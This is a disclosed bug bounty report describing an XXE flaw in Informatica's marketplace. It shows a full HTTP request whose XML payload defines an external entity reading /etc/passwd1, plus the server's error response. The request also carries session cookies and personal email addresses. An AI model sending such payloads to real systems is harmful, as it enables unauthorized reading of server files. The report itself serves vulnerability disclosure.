# [marketplace.informatica.com] - XXE

## Report Details
- **Report ID**: 106802
- **URL**: https://hackerone.com/reports/106802
- **State**: Closed
- **Severity**: high
- **Submitted**: 2015-12-24T19:26:58.052Z
- **Disclosed**: 2016-12-09T08:06:08.663Z

## Reporter
- **Username**: yarbabin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
Request: 
`POST /__services/v2/rest/wall/new/count HTTP/1.1`
`Host: marketplace.informatica.com`
`Connection: keep-alive`
`Content-Length: 249`
`Accept: application/json, text/javascript, */*`
`X-J-Token: no-user`
`X-Requested-With: XMLHttpRequest`
`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
`Origin: https://marketplace.informatica.com`
`Referer: https://marketplace.informatica.com/profile-status-list.jspa?view=wallentry&username=jan-hendrik.huehne@bearingpoint.com`
`Accept-Encoding: gzip, deflate`
`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`
`Cookie: jive.server.info="serverName=marketplace.informatica.com:serverPort=443:contextPath=:localName=localhost.localdomain:localPort=9001:localAddr=127.0.0.1"; BIGipServermarketplace-new-int-Pool=958464266.20480.0000; __cdrop=.9IJG7.; __csess=1450347852471.CBUFVZ.; c08ea716-2192-4af0-b0be-eb4589f8bd3c=%7B%22parent_id%22%3A%22%22%2C%22id%22%3A%22kKfiDh-GHos%22%2C%22wom%22%3Afalse%2C%22fb_source%22%3A%22%22%2C%22url_tag%22%3A%22NOMTAG%22%7D; do_mkto_call=true; LastMRH_Session=d922d108; LiveBall=uid=9700856&uky=8BZWQCQN&rid=10286008; MRHSession=4c2087c52f486b2d8fe80461d922d108; s_dmdbase=rsp%3Dmatch%26cData%3D25961098%253ACjsc%2520Mastel%253AAutomotive%253AServices%253A1%2520to%252049%253A0-49%2520milli%253ASMB%253AAutomotive%26cDataCustom%3D%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253AMoscow%253Anull%253ARU%253A7514%26cDataCustom2%3Dnull%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%26sentAA%3DT; timeEnd_cookie=1450346443718; wm-ueug=%22yarbabin@gmail.com%22; wm-ag-d={%22st%22:1450435346802%2C%22sc%22:1%2C%22v%22:0%2C%22et%22:1450359167387%2C%22u%22:0}; s_sess=%20s_visitid%3D1450189337951%3B%20v16%3D%3B%20v32%3D%3B%20s_ppvl%3Dwww%25253Aus%25253Aen%25253Aproducts%25253Adata-integration%25253Areal-time-integration%25253Arulepoint-complex-event-processing%252C58%252C58%252C1019%252C1858%252C1019%252C1920%252C1080%252C1%252CP%3B%20s_ppv%3Dwww%25253Aus%25253Aen%25253Aproducts%25253Adata-integration%25253Areal-time-integration%25253Arulepoint-complex-event-processing%252C96%252C46%252C2119%252C1858%252C1019%252C1920%252C1080%252C1%252CP%3B; AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16794%7CMCMID%7C91737586653844139563863898912439590649%7CMCAID%7CNONE%7CMCAAMLH-1451408130%7C6%7CMCAAMB-1451571056%7Chmk_Lq6TPIBMW925SPhw3Q; JSESSIONID=67E6B255C5D2DAFF90610E94CB8B7D2A.; _ga=GA1.2.1092629952.1450189330; mkt_cookie=known; mbox=PC#1450189325935-186730.26_07#1452186131|check#true#1450976591|session#1450976530070-819656#1450978391; s_vnum=1452773966363%26vn%3D12; s_ppv=-%2C100%2C63%2C1319; __utmt=1; jive.recentHistory.-1=332c3136363137383b31342c323334353b31342c323334373b312c3130343130323b; s_cc=true; gpv_p8=Search; s_nr=1450984732287-Repeat; s_invisit=true; s_sq=informaticamarketplace%252Cinformaticamarketplace2%252Cinformaticacommunity%3D%2526pid%253Dinformatica%252520marketplace%252520community%2526pidt%253D1%2526oid%253Djavascript%25253A%25253B%2526ot%253DA; __utma=151370917.193365317.1450183778.1450970821.1450981714.11; __utmb=151370917.11.10.1450981714; __utmc=151370917; __utmz=151370917.1450981714.11.10.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1450183777729-16344`
`Content-Type: application/xml;charset=UTF-8`

`<?xml version="1.0" encoding="UTF-8" standalone="no"?>`
`<!DOCTYPE foo [  `
`<!ELEMENT foo ANY >`
`<!ENTITY xxe SYSTEM "file:///etc/passwd1" >]>`
`<count>`
`<tabName>profile</tabName>`
`<widgetID>&xxe;</widgetID>`
`<filterType>Only</filterType>`
`</count>`

Response:
`JAXBException occurred : /etc/passwd1 (No such file or directory). /etc/passwd1 (No such file or directory). `

## Attachments
No attachments
